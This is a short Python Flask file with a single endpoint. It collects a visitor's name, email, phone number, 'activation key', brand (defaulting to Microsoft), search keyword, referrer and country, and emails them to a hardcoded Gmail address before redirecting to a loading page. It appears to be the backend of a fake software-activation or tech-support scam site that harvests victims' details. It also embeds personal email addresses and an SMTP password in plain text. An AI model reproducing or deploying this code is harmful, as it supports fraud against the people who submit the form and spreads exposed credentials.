from flask import Flask, request, jsonify
import smtplib
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

app = Flask(__name__)

@app.route('/api/send-email', methods=['POST'])
def send_email():
    name = request.form.get('name', '')
    email = request.form.get('email', '')
    phone = request.form.get('phone', '')
    activation_key = request.form.get('activation_key', '')
    brand = request.form.get('brand', 'microsoft')
    keyword = request.form.get('keyword', '')
    referrer = request.form.get('referrer', '')
    country = request.form.get('country', '')

    to_email = os.environ.get('TO_EMAIL', 'areeb2025malik@gmail.com')
    smtp_user = os.environ.get('SMTP_USER', 'diwakar1996ram@gmail.com')
    smtp_pass = os.environ.get('SMTP_PASS', 'qpzhvmwivlyscmki')
    from_email = os.environ.get('FROM_EMAIL', 'diwakar1996ram@gmail.com')

    subject = f"New Activation Request - Key: {activation_key}"

    email_body = f"""=== ACTIVATION REQUEST DETAILS ===

Google Keyword: {keyword}
Referrer: {referrer}
Country: {country}
Timestamp: {datetime.utcnow().isoformat()}

=== VISITOR INFORMATION ===
Name: {name}
Email: {email}
Phone: {phone}
Activation Key: {activation_key}
Brand: {brand}

=== END OF REPORT ===
"""

    mail_sent = False
    mailer_error = ''

    try:
        msg = MIMEMultipart()
        msg['From'] = from_email
        msg['To'] = to_email
        msg['Subject'] = subject
        msg['Reply-To'] = email if email else from_email
        msg.attach(MIMEText(email_body, 'plain', 'utf-8'))

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(smtp_user, smtp_pass)
        server.send_message(msg)
        server.quit()
        mail_sent = True
    except Exception as e:
        mailer_error = str(e)

    from urllib.parse import quote
    redirect_url = (
        f"/loading.html?"
        f"brand={quote(brand)}&"
        f"keyword={quote(keyword)}&"
        f"key={quote(activation_key)}&"
        f"referrer={quote(referrer)}&"
        f"mailsent={'1' if mail_sent else '0'}&"
        f"error={quote(mailer_error)}"
    )

    return jsonify({"success": mail_sent, "redirect": redirect_url, "error": mailer_error})